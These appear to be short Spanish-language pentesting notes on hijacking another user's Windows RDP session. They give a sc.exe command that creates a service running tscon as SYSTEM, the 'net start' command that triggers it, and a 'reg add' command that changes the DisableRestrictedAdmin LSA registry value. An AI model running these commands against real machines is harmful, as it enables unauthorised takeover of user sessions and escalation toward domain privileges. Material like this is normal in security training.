# Suplantación de identidad
Para ello necesitaremos permisos como SYSTEM, para ello podremos utilizar diferentes métodos como: [[Psexec]] o Mimikatz.

Una vez dentro podemos abrir una consola de comandos y ejecutar tanto `whoami` para ver que usuario somos como `query user` para ver todos los usuarios disponibles, con esto al lado del USERNAME podremos ver el ID y el SESSIONNAME que necesitaremos. La sintaxis es la siguiente:
```cmd
sc.exe create sessionhijack binpath= "cmd.exe /k tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}"
```
Y después:
```cmd
net start sessionhijack
```
Con esto se nos abriría una nueva terminal como ese usuario, que con suerte tiene permisos en el AD o administrador en el grupo HELP DESK

Hay veces que puede darnos el siguiente error:
![[Pasted image 20250926234339.png]]

Esto se puede habilitar añadiendo una nueva clave de registro `DisableRestrictedAdmin`(REG_DWORD) en`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`

Podemos hacerlo con el siguiente comando:
```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
